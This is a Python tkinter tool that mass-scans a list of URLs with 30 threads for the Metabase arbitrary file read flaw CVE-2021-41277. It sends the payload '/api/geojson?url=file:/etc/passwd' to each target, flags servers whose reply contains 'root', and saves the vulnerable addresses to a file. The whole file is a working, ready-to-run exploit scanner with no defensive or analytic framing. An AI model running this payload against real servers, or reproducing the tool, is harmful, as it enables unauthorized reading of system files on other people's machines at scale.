import requests
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def metabase_readfile_exp(url):
    poc = r"""/api/geojson?url=file:/etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            metabase_readfile_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            metabase_readfile_text.see(END)
            with open ("[exists]metabase_readfile_CVE_2021_41277_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            metabase_readfile_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            metabase_readfile_text.see(END)
    except Exception as err:
        metabase_readfile_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        metabase_readfile_text.see(END)
def get_metabase_readfile_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def metabase_readfile_gui():
    metabase_readfile = Toplevel()
    metabase_readfile.geometry("1035x455")
    metabase_readfile.title("MetaBase arbitrary file read(CVE-2021-41277) [auto-muti-exp]")
    metabase_readfile.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    metabase_readfile.tk.call('wm', 'iconphoto', metabase_readfile._w, logo)
    global metabase_readfile_text
    metabase_readfile_text = scrolledtext.ScrolledText(metabase_readfile,width=123, height=25)
    metabase_readfile_text.grid(row=0, column=0, padx=10, pady=10)
    metabase_readfile_text.see(END)
    addrs = get_metabase_readfile_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(metabase_readfile_exp, addr)
    metabase_readfile.mainloop()